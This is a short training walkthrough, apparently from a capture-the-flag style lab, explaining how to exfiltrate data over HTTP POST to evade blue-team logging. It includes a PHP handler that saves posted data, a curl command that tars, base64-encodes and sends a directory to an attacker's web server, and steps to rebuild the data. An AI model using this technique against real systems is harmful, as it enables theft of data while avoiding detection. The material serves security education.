# Data exfiltration over HTTP

It is challenging to detect for the blue team if using the POST HTTP method in the data exfiltration (with the GET 
request, all parameters are registered into the log file).

* POST requests are never cached
* POST requests do not remain in the browser history
* POST requests cannot be bookmarked
* POST requests have no restrictions on data length

To exfiltrate data over the HTTP protocol:

* An attacker sets up a web server with a data handler (`web.thm.com` and a `contact.php` page as a data handler).
* A C2 agent or an attacker sends the data (using the `curl` command).
* The webserver receives the data and stores it (`contact.php` receives the POST request and stores it into `/tmp`).
* The attacker logs into the webserver to have a copy of the received data.

The `contact.php` in `/var/www/html` on `web.thm.com` to handle POST requests via a file parameter and storing the received data in the `/tmp` directory as 
`http.bs64` file name:

```text
<?php 
if (isset($_POST['file'])) {
        $file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST['file']);
        fclose($file);
   }
?>
```

From the jumphost `ssh` into the `victim1.thm.com` machine with the given credentials:

    thm@jump-box:~$ ssh thm@victim1.thm.com

Check the data:

    thm@victim1:~$ ls -l

Send POST data via curl:

    thm@victim1:~$ curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php

From the victim1 or jump machine, log in to the webserver, `web.thm.com`, and check the `/tmp` directory:

    thm@victim1:~$ ssh thm@web.thm.com 
    thm@web:~$ ls -l /tmp/

Fix the broken `http.bs64` file (broken due to the URL encoding over HTTP). Using the sed command, replace the spaces 
with `+` characters to make it a valid `base64` string:

    thm@web:~$ sudo sed -i 's/ /+/g' /tmp/http.bs64

Restore the data:

    thm@web:~$ cat /tmp/http.bs64 | base64 -d | tar xvfz -

## HTTPS communications

One of the benefits of HTTPS is encrypting the transmitted data using SSL keys stored on a server. 
Apply the same technique as used for HTTP on a web server with SSL enabled, all transmitted data will be encrypted.  
